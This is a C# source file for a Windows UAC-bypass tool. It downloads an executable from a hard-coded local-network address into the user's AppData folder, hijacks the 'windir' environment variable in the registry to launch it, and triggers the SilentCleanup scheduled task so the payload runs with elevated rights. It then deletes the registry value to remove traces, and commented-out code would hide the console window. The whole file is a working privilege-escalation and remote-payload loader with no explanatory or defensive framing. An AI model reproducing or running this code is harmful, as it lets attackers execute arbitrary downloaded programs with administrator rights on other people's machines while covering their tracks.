using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UACBypass
{
    class Program
    {
        static string PayloadFile = "TheWarehouse.exe";
        static string PayloadPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), PayloadFile);
        static string PayloadLink => "http://192.168.0.3/resources/T.exe";
        /*
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        */

        static void DownloadFile()
        {
            using (var client = new WebClient())
            {
                Console.WriteLine("[+] Downloading resources...");
                Console.WriteLine($"[+] Payload path: {PayloadPath}");

                client.DownloadFile(PayloadLink, PayloadPath);
            }
        }

        static void Main(string[] args)
        {
            //IntPtr hwnd;
            //hwnd = GetConsoleWindow();
            //ShowWindow(hwnd, SW_SHOW);

            DownloadFile();

            Console.WriteLine("[+] Starting Bypass UAC.");
            Console.WriteLine($"[+] Payload to be executed: {PayloadPath}");

            try
            {
                RegistryKey key;

                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "cmd.exe /k " + PayloadPath + " & ", RegistryValueKind.String);
                key.Close();

                Console.WriteLine("[+] Enviroment variable `%windir%` created.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to create the enviroment variable `%windir%`.");
                Console.WriteLine("[-] Exit.");
            }

            Console.WriteLine("[+] Waiting 5 seconds before execution.");
            Thread.Sleep(5000);

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();

                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";

                Process.Start(startInfo);

                Console.WriteLine("[+] UAC Bypass application executed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to execute the application `schtasks.exe` to perform the bypass.");
            }

            DeleteKey();

            Console.WriteLine("[-] Exiting.");
        }

        public static void DeleteKey()
        {
            Console.WriteLine("[+] Registry cleaning will start in 5 seconds.");
            Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment", true);

                if (rkey != null)
                {
                    try
                    {
                        rkey.DeleteValue("windir");
                        rkey.Close();
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(@"[-] Unable to delete the registry key (Environment). Error " + err.Message);
                    }
                }

                Console.WriteLine("[+] Registry cleaned.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to clean the registry.");
            }
        }
    }
}